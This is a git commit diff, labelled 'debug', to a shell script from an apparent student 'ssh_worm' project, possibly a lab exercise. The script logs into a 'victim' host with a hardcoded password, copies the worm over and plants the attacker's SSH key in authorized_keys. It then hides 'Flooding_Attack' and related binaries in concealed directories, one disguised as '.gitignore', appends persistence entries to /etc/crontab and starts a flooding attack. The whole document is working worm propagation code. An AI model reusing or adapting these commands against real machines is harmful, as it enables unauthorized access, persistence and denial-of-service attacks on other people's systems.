32dbff7ad20afcd5ce7402179fa27fb9604c210b
SongYun <william0228.cs05@g2.nctu.edu.tw>
2019-05-02 10:29:46 +0800

    debug

--- qq.sh
+++ qq.sh
@@ -5,30 +5,30 @@ export SSHPASS='victim'
 read -p "Enter Victim IP Address: " IP_Address
 read -p "First?(y/n) " First
 
-sshpass -e scp -r /home/victim/Desktop/ssh_worm victim@"$IP_Address":/home/victim/Desktop
+sshpass -e scp -r /home/cs2019/Desktop/ssh_worm victim@"$IP_Address":/home/victim/Desktop
 
 # publickey
 SSH_PATH="/home/victim/.ssh"
 
-if [ "$First" = "y" ];
-then
-	(
-	echo "\r"
-	sleep 1
-	echo "\r"
-	sleep 1
-	echo "\r"
-	sleep 1
-	echo "yes\r"
-	)|ssh-keygen
-else 
-	(
-	echo "\r"
-	sleep 1
-	echo "n\r"
-	sleep 1
-	)|ssh-keygen
-fi
+#if [ "$First" = "y" ];
+#then
+#	(
+#	echo "\r"
+#	sleep 1
+#	echo "\r"
+#	sleep 1
+#	echo "\r"
+#	sleep 1
+#	echo "yes\r"
+#	)|ssh-keygen
+#else 
+#	(
+#	echo "\r"
+#	sleep 1
+#	echo "n\r"
+#	sleep 1
+#	)|ssh-keygen
+#fi
 
 # sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
 (echo "victim\r")|sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys
@@ -36,4 +36,4 @@ fi
 
 ssh victim@"$IP_Address" 'Hidden1="/home/victim/.etc/.gitignore"; mkdir -p $Hidden1; chmod 777 $Hidden1; cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack $Hidden1; cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack $Hidden1; cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden1 > /dev/null 2>&1'
 ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack"; mkdir -p $Hidden2; chmod 777 $Hidden2; cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack $Hidden2; cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack $Hidden2; cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden2 > /dev/null 2>&1'
-ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack"; chmod 777 /etc/crontab; echo "$(cat /home/victim/Desktop/ssh_worm/crontab.txt)" >> /etc/crontab; cd "$Hidden2" && ./Flooding_Attack > /dev/null 2>&1'
+ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack"; sudo chmod +w /etc/crontab; echo "$(cat /home/victim/Desktop/ssh_worm/crontab.txt)" >> /etc/crontab; cd "$Hidden2" && ./Flooding_Attack > /dev/null 2>&1'
